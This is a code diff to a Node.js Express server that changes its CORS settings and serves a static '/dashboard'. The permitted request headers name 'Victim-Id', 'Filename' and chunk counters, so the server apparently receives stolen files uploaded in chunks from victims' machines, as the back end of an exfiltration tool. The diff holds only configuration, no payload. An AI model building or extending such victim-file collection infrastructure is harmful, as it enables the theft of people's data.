@@ -16,22 +16,25 @@ const sslOptions = {
 
 // Enable CORS with specific options
 const corsOptions = {
-  origin: ['https://front-ehzwe8vjh-2naseernoors-projects.vercel.app'], // Array for flexibility
-  methods: 'GET, POST, OPTIONS',
-  allowedHeaders: 'Content-Type, Victim-Id, Filename, Chunk-Index, Total-Chunks',
+  origin: ['https://front-ehzwe8vjh-2naseernoors-projects.vercel.app'],
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
   credentials: true,
 };
-app.use(cors(corsOptions));
-app.options('*', (req, res) => {
-  res.header('Access-Control-Allow-Origin', 'https://front-ehzwe8vjh-2naseernoors-projects.vercel.app');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Content-Type, Victim-Id, Filename, Chunk-Index, Total-Chunks');
-  res.sendStatus(200);
-});
-
 
 app.use(cors(corsOptions));
 app.options('*', cors(corsOptions));
+
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "https://front-ehzwe8vjh-2naseernoors-projects.vercel.app");
+  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.header("Access-Control-Allow-Headers", "Content-Type, Victim-Id, Filename, Chunk-Index, Total-Chunks");
+  res.header("Access-Control-Allow-Credentials", "true");
+  if (req.method === 'OPTIONS') {
+    return res.status(204).end();
+  }
+  next();
+});
 
 // Serve the dashboard as static files
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
